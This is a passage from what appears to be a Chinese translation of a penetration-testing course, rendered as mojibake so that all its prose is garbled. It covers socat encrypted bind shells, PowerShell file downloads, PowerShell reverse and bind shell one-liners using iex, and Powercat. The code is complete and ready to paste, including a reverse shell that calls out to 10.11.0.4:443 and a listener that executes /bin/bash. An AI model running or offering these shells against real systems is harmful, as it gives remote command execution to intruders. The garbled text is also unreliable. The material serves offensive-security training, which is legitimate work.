å¯†ï¼Œæˆ‘ä»¬å°†ä¾é å®‰å…¨å¥—æ¥å­—å±‚è¯ä¹¦ã€‚è¿™ç§çº§åˆ«çš„åŠ å¯†å°†æœ‰åŠ©äºèº²é¿å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼ˆIDSï¼‰ï¼Œå¹¶æœ‰åŠ©äºéšè—æˆ‘ä»¬æ­£åœ¨ä¼ è¾“çš„æ•æ„Ÿæ•°æ®ã€‚\n\nç»§ç»­ä»¥ Alice å’Œ Bob ä¸ºä¾‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ openssl åº”ç”¨ç¨‹åºåˆ›å»ºä¸€ä¸ªè‡ªç­¾åçš„è¯ä¹¦ï¼Œä½¿ç”¨ä»¥ä¸‹é€‰é¡¹ã€‚\n\n- reqï¼šå‘èµ·ä¸€ä¸ªæ–°çš„è¯ä¹¦ç­¾ç½²è¯·æ±‚\n- newkeyï¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ç§é’¥\n- ras:2048ï¼šä½¿ç”¨ RSA åŠ å¯†ï¼Œç§˜é’¥é•¿åº¦ä¸º 2048 ä½\n- nodesï¼šå­˜å‚¨æ²¡æœ‰å£ä»¤ä¿æŠ¤çš„ç§é’¥\n- keyoutï¼šå°†ç§˜é’¥ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­\n- x509ï¼šè¾“å‡ºä¸€ä¸ªè‡ªç­¾åçš„è¯ä¹¦ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªè¯ä¹¦è¯·æ±‚\n- daysï¼šè®¾ç½®æœ‰æ•ˆæœŸï¼Œä»¥å¤©ä¸ºå•ä½\n- outï¼šå°†è¯ä¹¦ä¿å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­\n\nä¸€æ—¦æˆ‘ä»¬ç”Ÿæˆäº†ç§˜é’¥ï¼Œæˆ‘ä»¬å°†æŠŠè¯ä¹¦å’Œå®ƒçš„ç§é’¥å­˜åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œï¼Œæˆ‘ä»¬æœ€ç»ˆå°†ç”¨å®ƒæ¥åŠ å¯†æˆ‘ä»¬çš„ æ­£å‘ Shellã€‚\n\næˆ‘ä»¬ç°åœ¨è®²åœ¨ Alice çš„æœºå™¨ä¸Šå®Œæˆè¿™ä¸ªè¿‡ç¨‹ã€‚\n\n```bash\nkali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days\n362 -out bind_shell.crt\nGenerating a 2048 bit RSA private key\n....................+++\n...............................+++\nwriting new private key to 'bind_shell.key'\n-----\nYou are about to be asked to enter information that will be incorporated\ninto your certificate request.\nWhat you are about to enter is what is called a Distinguished Name or a DN.\nThere are quite a few fields but you can leave some blank\nFor some fields there will be a default value,\nIf you enter '.', the field will be left blank.\n-----\nCountry Name (2 letter code) [AU]:US\nState or Province Name (full name) [Some-State]:Georgia\nLocality Name (eg, city) []:Atlanta\nOrganization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec\nOrganizational Unit Name (eg, section) []:Try Harder Department\nCommon Name (e.g. server FQDN or YOUR name) []:\nEmail Address []:\nkali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem\n```\n\nç°åœ¨ç§˜é’¥å’Œè¯ä¹¦å·²ç»ç”Ÿæˆï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦æŠŠå®ƒä»¬è½¬æ¢æˆ socat å¯ä»¥æ¥å—çš„æ ¼å¼ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬åœ¨åˆ›å»ºåŠ å¯†çš„ socat ç›‘å¬å™¨ä¹‹å‰ï¼Œå°† bind_shell.key å’Œ bind_shell.crt ä¸¤ä¸ªæ–‡ä»¶åˆå¹¶æˆä¸€ä¸ª .pem æ–‡ä»¶ã€‚\n\næˆ‘ä»¬å°†ä½¿ç”¨ OPENSSL-LISTEN é€‰é¡¹åœ¨ 443 ç«¯å£åˆ›å»ºç›‘å¬å™¨ï¼Œcert=bind_shell.pem æ¥æŒ‡å®šæˆ‘ä»¬çš„è¯ä¹¦æ–‡ä»¶ï¼Œverify æ¥ç¦ç”¨ SSL éªŒè¯ï¼Œfork æ¥åœ¨ç›‘å¬å™¨æœ‰è¿æ¥æ—¶ç”Ÿæˆä¸€ä¸ªå­è¿›ç¨‹ã€‚\n\n```bash\nkali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork\nEXEC:/bin/bash\n```\n\nç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å°† Bob çš„ç”µè„‘è¿æ¥åˆ° Alice çš„ æ­£å‘ shellã€‚\n\næˆ‘ä»¬å°†ä½¿ç”¨ `-` åœ¨ STDIO å’Œè¿œç¨‹ä¸»æœºä¹‹é—´ä¼ è¾“æ•°æ®ï¼Œä½¿ç”¨ OPENSSL å»ºç«‹ä¸€ä¸ªè¿œç¨‹ SSL è¿æ¥åˆ° 10.11.0.4:443 çš„ Alice ç›‘å¬å™¨ï¼Œä½¿ç”¨ verify=0 æ¥ç¦ç”¨ SSL è¯ä¹¦éªŒè¯ã€‚\n\n```bash\nC:\\\\Users\\\\offsec> socat - OPENSSL:10.11.0.4:443,verify=0\nid\nuid=0(root) gid=0(root) groups=0(root)\nwhoami\nroot\n```\n\nå¾ˆå¥½ï¼æˆ‘ä»¬çš„æ­£å‘ shell åˆ›å»ºæˆåŠŸäº†ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå‘ Alice çš„æœºå™¨ä¼ é€’å‘½ä»¤ã€‚\n\nèŠ±äº›æ—¶é—´è‡ªå·±å»æ¢ç´¢ socatã€‚è¿™æ˜¯è®¸å¤šå·¥å…·ä¸­çš„ä¸€ä¸ªï¼Œåœ¨æ¸—é€æµ‹è¯•ä¸­ä¼šéå¸¸æœ‰ç›Šã€‚\n\n## PowerShell å’Œ Powercat\n\nWindows PowerShell æ˜¯ä¸€ç§åŸºäºä»»åŠ¡çš„å‘½ä»¤è¡Œå¤–å£³å’Œè„šæœ¬è¯­è¨€ã€‚å®ƒæ˜¯ä¸“é—¨ä¸ºç³»ç»Ÿç®¡ç†å‘˜å’Œç”µåŠ›ç”¨æˆ·æ¶‰åŠçš„ï¼Œç”¨äºå¿«é€Ÿè‡ªåŠ¨åŒ–ç®¡ç†å¤šä¸ªæ“ä½œç³»ç»Ÿï¼ˆLinuxã€MacOSã€Unix å’Œ Windowsï¼‰ä»¥åŠåœ¨è¿™äº›ç³»ç»Ÿä¸Šè¿è¡Œçš„åº”ç”¨ç¨‹åºçš„ç›¸å…³è¿›ç¨‹ã€‚\n\næ¯‹åº¸ç½®ç–‘ï¼ŒPowerShell æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ¸—é€æµ‹è¯•å·¥å…·ï¼Œå¯ä»¥å®‰è£…åœ¨ï¼ˆæˆ–é»˜è®¤å®‰è£…åœ¨ï¼‰å„ç§ç‰ˆæœ¬çš„ Windows ä¸Šã€‚ä» Winodws Server 2008 R2 å’Œ Windows 7 å¼€å§‹ï¼Œå®ƒè¢«é»˜è®¤å®‰è£…åœ¨ç°ä»£ Windows å¹³å°ä¸Šã€‚Windows PowerShell 5.0 å¯ä»¥åœ¨ä»¥ä¸‹ç‰ˆæœ¬çš„ Windows ä¸Šè¿è¡Œã€‚\n\n- Windows Server 2016 é»˜è®¤å®‰è£…\n- Windows Server 2012 R2/Windows 2012/Windows Server 2008 R2 with Service Pack 1/Windows 8.1/Windows7 with Service Pack 1ï¼ˆå®‰è£… Windows Management Framework 5.0 ä»¥è¿è¡Œå®ƒï¼‰\n\nWindows PowerShell 4.0 å¯ä»¥åœ¨ä»¥ä¸‹ç‰ˆæœ¬çš„ Winodws ä¸­è¿è¡Œã€‚\n\n- Windows 8.1/Windows Server 2012 R2 é»˜è®¤å®‰è£…\n- å¸¦æœ‰ Service Pack çš„ Windows 7/å¸¦æœ‰ Service Pack çš„ Windows Server 2008 R2ï¼ˆå®‰è£… Windows Management Framework 4.0 ä»¥è¿è¡Œå®ƒï¼‰\n\nWindows PowerShell 3.0 å¯ä»¥åœ¨ä»¥ä¸‹ç‰ˆæœ¬çš„ Windows ä¸­è¿è¡Œã€‚\n\n- Windows 8/Windows Server 2012 é»˜è®¤å®‰è£…\n- å¸¦æœ‰ Service Pack çš„ Windows 7/å¸¦æœ‰ Service Pack 1/2 çš„ Windows Server 2008 R2ï¼ˆå®‰è£… Windows Management Framework 3.0 ä»¥è¿è¡Œå®ƒï¼‰\n\nPowerShell åŒ…å«ä¸€ä¸ªå†…ç½®çš„é›†æˆå¼€å‘ç¯å¢ƒï¼ˆIDEï¼‰ï¼Œè¢«ç§°ä¸º Windows PowerShell é›†æˆè„šæœ¬ç¯å¢ƒï¼ˆISEï¼‰ã€‚ISE æ˜¯ Windows PowerShell çš„ä¸€ä¸ªä¸»æœºåº”ç”¨ç¨‹åºï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€ä¸ªåŸºäº Winodws çš„å›¾å½¢ç”¨æˆ·ç•Œé¢ä¸­è¿è¡Œå‘½ä»¤ã€ç¼–å†™ã€æµ‹è¯•å’Œè°ƒè¯•è„šæœ¬ã€‚è¯¥ç•Œé¢æä¾›å¤šè¡Œç¼–è¾‘ã€æ ‡ç­¾å®Œæˆã€è¯­æ³•ç€è‰²ã€é€‰æ‹©æ€§æ‰§è¡Œã€ä¸Šä¸‹æ–‡æ•æ„Ÿå¸®åŠ©ã€æ”¯æŒä»å³åˆ°å·¦çš„è¯­è¨€ç­‰ç­‰ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/aa0559c6-074d-4166-ae5a-b67a69a4cd5c/Untitled.png)\n\nPowerShell ç»´æŠ¤ä¸€ä¸ªæ‰§è¡Œç­–ç•¥ï¼Œå†³å®šå“ªç§ç±»å‹çš„ PowerShell è„šæœ¬ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰å¯ä»¥åœ¨ç³»ç»Ÿä¸Šè¿è¡Œã€‚é»˜è®¤ç­–ç•¥æ˜¯â€œå—é™â€ï¼Œè¿™å®é™…ä¸Šæ„å‘³ç€ç³»ç»Ÿæ—¢ä¸ä¼šåŠ è½½ PowerShell é…ç½®æ–‡ä»¶ï¼Œä¹Ÿä¸ä¼šè¿è¡Œ PowerShell è„šæœ¬ã€‚ä¸ºäº†æœ¬æ¨¡å—çš„ç›®çš„ï¼Œæˆ‘ä»¬éœ€è¦åœ¨ Windows å®¢æˆ·æœºä¸Šè®¾ç½®ä¸€ä¸ªâ€œä¸å—é™åˆ¶â€çš„æ‰§è¡Œç­–ç•¥ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬ç‚¹å‡» Windows å¼€å§‹æŒ‰é’®ï¼Œå³é”®å•å‡» Windows PowerShell åº”ç”¨ç¨‹åºï¼Œé€‰æ‹©ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œã€‚å½“å‡ºç°ç”¨æˆ·è´¦æˆ·æ§åˆ¶æç¤ºæ—¶ï¼Œé€‰æ‹©æ˜¯ï¼Œå¹¶è¾“å…¥ Set-ExecutionPolicy Unrestrictedã€‚\n\n```bash\nWindows PowerShell\nCopyright (C) Microsoft Corporation. All rights reserved.\n\nPS C:\\\\WINDOWS\\\\system32> Set-ExecutionPolicy Unrestricted\n\nExecution Policy Change\nThe execution policy helps protect you from scripts that you do not trust. Changing\nthe execution policy might expose you to the security risks described in the\nabout_Execution_Policies help topic at https:/go.microsoft.com/fwlink/?LinkID=135170.\nDo you want to change the execution policy?\n[Y] Yes [A] Yes to All [N] No [L] No to All [S] Suspend [?] Help (default is\n\"N\"): y\n\nPS C:\\\\WINDOWS\\\\system32> Get-ExecutionPolicy\nUnrestricted\n```\n\nPowerShell æ—¢åæ˜ è¿…é€ŸåˆåŠŸèƒ½å¼ºå¤§ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿæ‰§è¡Œå¤šç§ä»»åŠ¡ï¼Œè€Œæ— éœ€åœ¨ç›®æ ‡ä¸Šå®‰è£…é¢å¤–çš„å·¥å…·ã€‚è®©æˆ‘ä»¬å†æ¥æ¢è®¨ä¸€ä¸‹ PowerShellï¼Œä»¥å±•ç¤ºå®ƒåœ¨æ¸—é€æµ‹è¯•ä¸­å¯èƒ½å‘æŒ¥çš„ä½œç”¨ã€‚\n\n### PowerShell æ–‡ä»¶ä¼ è¾“\n\nç»§ç»­è®¨è®º Alice å’Œ Bobï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ PowerShell ä» Bob å‘ Alice ä¼ è¾“ä¸€ä¸ªæ–‡ä»¶ã€‚ç”±äº PowerShell çš„å¼ºå¤§å’Œçµæ´»ï¼Œè¿™å¹¶ä¸åƒä½¿ç”¨ Netcat ç”šè‡³ Socat é‚£æ ·ç®€å•æ˜äº†ï¼Œä½¿å¾—è¿™å‰å‡ ä¸ªå‘½ä»¤ä¹ä¸€çœ‹æœ‰ç‚¹æ··ä¹±ã€‚æˆ‘ä»¬å°†æ‰§è¡Œè¯¥å‘½ä»¤ï¼Œç„¶ååˆ†è§£å„éƒ¨åˆ†ã€‚\n\n```bash\nC:\\\\Users\\\\offsec> powershell -c \"(new-objectSystem.Net.WebClient).DownloadFile('<http://10.11.0.4/wget.exe','C:\\\\Users\\\\offsec\\\\Desktop\\\\wget.exe>')\"\n\nC:\\\\Users\\\\offsec\\\\Desktop> wget.exe -V GNU Wget 1.9.1\n\nCopyright (C) 2003 Free Software Foundation, Inc.\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\nGNU General Public License for more details.\n\nOriginally written by Hrvoje Niksic <hniksic@xemacs.org>.\n```\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå‘½ä»¤æ‰§è¡Œäº†ï¼Œæ–‡ä»¶è¢«è½¬ç§»äº†ï¼Œè€Œä¸”æ‰§è¡Œå¾—å¾ˆé¡ºåˆ©ã€‚è®©æˆ‘ä»¬åˆ†æä¸€ä¸‹ä½¿ä¹‹å‘ç”Ÿçš„ PowerShell å‘½ä»¤ã€‚\n\né¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨äº† `-c` é€‰é¡¹ã€‚è¿™å°†æ‰§è¡Œæ‰€æä¾›çš„å‘½ä»¤ï¼ˆç”¨åŒå¼•å·åŒ…è£¹ï¼‰ï¼Œå°±åƒåœ¨ PowerShell æç¤ºç¬¦ä¸‹è¾“å…¥çš„é‚£æ ·ã€‚\n\næˆ‘ä»¬æ­£åœ¨æ‰§è¡Œçš„å‘½ä»¤åŒ…å«å‡ ä¸ªéƒ¨åˆ†ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬ä½¿ç”¨ â€œnewobjectâ€ cmdletï¼Œå®ƒå…è®¸æˆ‘ä»¬å®ä¾‹åŒ–ä¸€ä¸ª .Net æ¡†æ¶æˆ–ä¸€ä¸ª COM å¯¹è±¡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ­£åœ¨åˆ›å»ºä¸€ä¸ª WebClient ç±»çš„å®ä¾‹ï¼Œå®ƒæ˜¯åœ¨ [System.Net](http://System.Net) å‘½åç©ºé—´ä¸­å®šä¹‰å’Œå®ç°çš„ã€‚WebClient ç±»ç”¨äºè®¿é—®ç”± URI è¯†åˆ«çš„èµ„æºï¼Œå®ƒæš´éœ²äº†ä¸€ä¸ªåä¸º DownloadFile çš„å…¬å…±æ–¹æ³•ï¼Œè¯¥æ–¹æ³•éœ€è¦æˆ‘ä»¬çš„ä¸¤ä¸ªå…³é”®å‚æ•°ï¼šä¸€ä¸ªæºä½ç½®ï¼ˆå¦‚æˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„ URI å½¢å¼ï¼‰ï¼Œä»¥åŠä¸€ä¸ªç›®æ ‡ä½ç½®ï¼Œæ£€ç´¢åˆ°çš„æ•°æ®åº“å°†è¢«å­˜å‚¨åœ¨é‚£é‡Œã€‚\n\nè¿™ä¸ªè¯­æ³•å¯èƒ½çœ‹èµ·æ¥å¾ˆæ··ä¹±ï¼Œä½†å®é™…ä¸Šæ˜¯ç›¸å½“ç®€å•çš„ã€‚è¯·å‚è€ƒå¾®è½¯ [System.Net](http://System.Net) å‚è€ƒèµ„æ–™ï¼Œçœ‹çœ‹è¿™ä¸ªå‘½åç©ºé—´ä¸­æ‰€æœ‰å®ç°çš„ç±»çš„åˆ—è¡¨ã€‚ç„¶åï¼Œæ¥ç€çœ‹ WebClient ç±»ï¼Œæœ€åçœ‹ DownloadFile æ–¹æ³•ï¼Œä»¥ç›´è§‚åœ°äº†è§£æˆ‘ä»¬çš„ä¾‹å­ä¸­ä½¿ç”¨çš„ç±»å’Œæ–¹æ³•çš„ç»“æ„ã€‚\n\nåœ¨ Bob çš„ç”µè„‘ä¸Šä¸‹è½½äº† wget.exe å¯æ‰§è¡Œæ–‡ä»¶åï¼Œä»–å¯ä»¥æŠŠå®ƒä½œä¸ºå¦ä¸€ä¸ªå·¥å…·æ¥ä¸‹è½½æ›´å¤šçš„æ–‡ä»¶æˆ–ç»§ç»­ä½¿ç”¨ PowerShellã€‚\n\n### PowerShell åå‘ Shell\n\nåœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†åˆ©ç”¨ PowerShell å•ä»£ç æ¥æ‰§è¡Œ Shellï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ªåå‘ Shellã€‚\n\né¦–å…ˆï¼Œæˆ‘ä»¬å°†åœ¨ Alice çš„ç”µè„‘ä¸Šè®¾ç½®ä¸€ä¸ªç®€å•çš„ Netcat ç›‘å¬å™¨ï¼š\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443\nlistening on [any] 443 ...\n```\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†ä» Bob çš„ç”µè„‘ä¸Šå‘é€ä¸€ä¸ª PowerShell åå‘ Shellã€‚åŒæ ·ï¼Œè¿™åœ¨è¯­æ³•ä¸Šä¸å¦‚ Netcat æˆ– Socat å¹²å‡€ï¼Œä½†ç”±äº PowerShell åœ¨å¤§å¤šæ•°ç°ä»£ Winodws æœºå™¨ä¸Šæ˜¯åŸç”Ÿçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¢ç´¢è¿™ä¸ª PowerShell çš„ç­‰ä»·ç‰©æ˜¯å¾ˆé‡è¦çš„ã€‚é¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ä»£ç ï¼Œç„¶åæŠŠä»–åˆ†è§£ã€‚\n\n```bash\n$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{\n $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n $sendback = (iex $data 2>&1 | Out-String );\n $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n $stream.Write($sendbyte,0,$sendbyte.Length);\n $stream.Flush();\n}\n$client.Close();\n```\n\nä¸æˆ‘ä»¬ä»¥å‰ä½¿ç”¨çš„å·¥å…·ç›¸æ¯”ï¼Œè¿™å¯èƒ½çœ‹èµ·æ¥éå¸¸å¤æ‚ã€‚ç„¶è€Œï¼ŒPowerShell æ˜¯å¼ºå¤§è€Œçµæ´»çš„ï¼›å®ƒä¸æ˜¯ä¸€ä¸ªå•ä¸€åŠŸèƒ½çš„å·¥å…·ã€‚æ­£å› ä¸ºå¦‚æ­¤ã€‚æˆ‘ä»¬å¿…é¡»ä½¿ç”¨ä¸€ä¸ªå¤æ‚çš„è¯­æ³•æ¥è°ƒç”¨å¤æ‚çš„åŠŸèƒ½ã€‚\n\nè¿™æ®µä»£ç ç”±å‡ ä¸ªå‘½ä»¤ç»„æˆï¼Œç”¨åˆ†å·éš”å¼€ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªå®¢æˆ·ç«¯å˜é‡ï¼Œå®ƒè¢«åˆ†é…äº†ç›®æ ‡ IP åœ°å€ï¼Œä¸€ä¸ªæµå˜é‡ï¼Œä¸€ä¸ªç§°ä¸º bytes çš„å­—èŠ‚æ•°ç»„ï¼Œä»¥åŠä¸€ä¸ª while å¾ªç¯ï¼Œæ¥ç€æ˜¯ä¸€ä¸ªå…³é—­å®¢æˆ·ç«¯è¿æ¥çš„è°ƒç”¨ã€‚åœ¨ while å¾ªç¯ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡ è¡Œè´Ÿè´£å‘ç½‘ç»œæµè¯»å†™æ•°æ®ã€‚è¯·æ³¨æ„ï¼Œiexï¼ˆâ€Invoke-Expressionâ€ï¼‰cmdlet æ˜¯è¿™ä¸ªä»£ç å—çš„å…³é”®éƒ¨åˆ†ï¼Œå› ä¸ºå®ƒæŠŠæ”¶åˆ°çš„ä»»ä½•å­—ç¬¦ä¸²ä½œä¸ºå‘½ä»¤è¿è¡Œï¼Œç„¶åå‘½ä»¤çš„ç»“æœè¢«é‡å®šå‘å¹¶é€šè¿‡æ•°æ®æµå‘é€å›æ¥ã€‚\n\nè¿™æ®µä»£ç å¯ä»¥è¢«å·è¿›ä¸€ä¸ªå…¬è®¤çš„å†—é•¿çš„å•è¡Œä»£ç ï¼Œåœ¨å‘½ä»¤æç¤ºç¬¦ä¸‹æ‰§è¡Œï¼š\n\n```bash\nC:\\\\Users\\\\offsec> powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()\"\n```\n\nè¿™ä¸ªå•è¡Œä»£ç ä¹ä¸€çœ‹ä¼¼ä¹éå¸¸è‰°å·¨ï¼Œä½†æ²¡æœ‰å¿…è¦è®°ä½å®ƒï¼›åœ¨ç°åœºæ¸—é€æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¤åˆ¶å’Œç²˜è´´è¿™ç§ç±»å‹çš„å‘½ä»¤ï¼ˆæ›¿æ¢ IP å’Œç«¯å£å·ï¼‰ã€‚\n\næœ€åï¼Œæˆ‘ä»¬ç”¨ Netcat æ¥æ”¶åå‘ Shellã€‚\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63515\n\nPS C:\\\\Users\\\\offsec>\n```\n\næ€»ä¹‹ï¼Œé€šè¿‡ç®€å•çš„æ›¿æ¢ System.Net.Sockets.TCPClient è°ƒç”¨ä¸­çš„ IP åœ°å€å’Œç«¯å£å·ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°é‡å¤ä½¿ç”¨è¿™ä¸ª PowerShell åå‘ Shell å‘½ä»¤ã€‚\n\n### PowerShell æ­£å‘ Shell\n\nåœ¨å¤„ç†æ­£å‘ Shell çš„æ—¶å€™ï¼Œè¿‡ç¨‹æ˜¯ç›¸åçš„ã€‚æˆ‘ä»¬é¦–å…ˆé€šè¿‡ PowerShell åœ¨ Bob çš„ç”µè„‘ä¸Šåˆ›å»ºæ­£å‘ Shellï¼Œç„¶åç”¨ Netcat ä» Alice çš„ç”µè„‘ä¸Šè¿æ¥åˆ°å®ƒã€‚\n\nåœ¨ä¸‹é¢çš„ä»£ç ç‰‡æ®µä¸­ï¼Œæˆ‘ä»¬å°†å†æ¬¡ä½¿ç”¨ `-c` é€‰é¡¹å°†æˆ‘ä»¬çš„å‘½ä»¤ä¼ é€’ç»™ PowerShellã€‚ä¸åå‘ Shell ä¸€æ ·ï¼Œè¿™ä¸ªå¤æ‚çš„å‘½ä»¤å¯ä»¥åˆ†è§£æˆå‡ ä¸ªå‘½ä»¤ã€‚é™¤äº†å®¢æˆ·ç«¯ã€æµå’Œå­—èŠ‚é›†å˜é‡å¤–ï¼Œæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªæ–°çš„ç›‘å¬å™¨å˜é‡ï¼Œå®ƒä½¿ç”¨ System.Net.Sockets.TcpListener ç±»ã€‚è¿™ä¸ªç±»éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼šé¦–å…ˆæ˜¯è¦ç›‘å¬çš„åœ°å€ï¼Œå…¶æ¬¡æ˜¯ç«¯å£ã€‚é€šè¿‡æä¾› 0.0.0.0 ä½œä¸ºæœ¬åœ°åœ°å€ï¼Œæˆ‘ä»¬çš„æ­£å‘ Shell å°†åœ¨ç³»ç»Ÿçš„æ‰€æœ‰ IP åœ°å€ä¸Šå¯ç”¨ã€‚åŒæ ·ï¼Œæˆ‘ä»¬ä½¿ç”¨ iex cmdlet æ¥æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ã€‚\n\n```bash\nC:\\\\Users\\\\offsec> powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"\n```\n\næœ‰äº†æ­£å‘ Shell çš„ç›‘å¬ï¼Œæˆ‘ä»¬å¯ä»¥ä» Alice çš„æœºå™¨ä¸Šç”¨ Netcat è¿æ¥åˆ°å®ƒï¼Œå°±åƒæˆ‘ä»¬ç”¨å…¶ä»–çš„ Shell ä¸€æ ·ã€‚æˆ‘ä»¬åŒ…æ‹¬ Netcat çš„ `-v` é€‰é¡¹ï¼Œå› ä¸ºæˆ‘ä»¬çš„æ­£å‘ Shell åœ¨ç¬¬ä¸€è¿æ¥æ—¶ä¸ä¸€å®šä¼šå‡ºç°å‘½ä»¤æç¤ºã€‚\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 443\n(UNKNOWN) [10.11.0.22] 443 (https) open\nipconfig\nWindows IP Configuration\nEthernet adapter Local Area Connection:\n Connection-specific DNS Suffix . :\n IPv4 Address. . . . . . . . . . . : 10.11.0.22\n Subnet Mask . . . . . . . . . . . : 255.255.255.0\n Default Gateway . . . . . . . . . : 10.11.0.1\n\nC:\\\\Users\\\\offsec>\n```\n\nPowerShell å¼ºå¤§å¾—ä»¤äººå‘æŒ‡ï¼Œæˆ‘ä»¬ç”šè‡³è¿˜æ²¡æœ‰æ¥è¿‘å®ƒçš„åŠŸèƒ½çš„è¡¨é¢ã€‚ç”±äºå¾®è½¯è¶Šæ¥è¶Šå¤šåœ°å°† PowerShell ç”¨äºåŸºäº Windows çš„ç®¡ç†å’Œè‡ªåŠ¨åŒ–ï¼ŒçŸ¥é“å¦‚ä½•æ­£ç¡®ä½¿ç”¨ PwerShell æ¥å®ç°æˆ‘ä»¬çš„ç›®æ ‡æ˜¯æå…¶é‡è¦çš„ã€‚è¯·å‚è€ƒå¾®è½¯ PowerShell æ–‡æ¡£å’Œå¾®è½¯ [System.Net](http://System.Net) å‚è€ƒï¼Œä»¥äº†è§£æ›´å¤šçš„ç±»å’Œæ–¹æ³•ï¼Œä»¥åŠç½‘ä¸Šæä¾›çš„å„ç§ PowerShell åŸ¹è®­å’Œè®²åº§ã€‚\n\n### Powercat\n\nPowercat æœ¬è´¨ä¸Šæ˜¯ç”± Besimorhino ç¼–å†™çš„ Netcat çš„ PowerShell ç‰ˆæœ¬ã€‚å®ƒæ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥ä¸‹è½½åˆ° Windows ä¸»æœºä¸Šçš„è„šæœ¬ï¼Œä»¥åˆ©ç”¨ PowerShell çš„ä¼˜åŠ¿ï¼Œå¹¶ç®€åŒ–äº†æ­£å‘/åå‘ Shell çš„åˆ›å»ºã€‚\n\n<aside> ğŸ’¡ Powercat å¯ä»¥é€šè¿‡ apt install powercat åœ¨ Kali ä¸­å®‰è£…ï¼Œå®ƒå°†æŠŠè„šæœ¬æ”¾åœ¨ /usr/share/windows-resources/powercat ä¸­ã€‚\n\n</aside>\n\næˆ‘ä»¬å¯ä»¥è·³è¿‡ç¬¬ä¸€æ­¥ï¼Œå³æŠŠè„šæœ¬ä»æˆ‘ä»¬çš„ Kali Linux æœºå™¨è½¬ç§»åˆ° Windows ä¸»æœºï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»ç†Ÿæ‚‰äº†æ–‡ä»¶ä¼ è¾“ã€‚\n\nåœ¨ç›®æ ‡ä¸»æœºä¸Šçš„è„šæœ¬ï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨ PowerShell çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå³ Dot-sourcing æ¥åŠ è½½ powercat.ps1 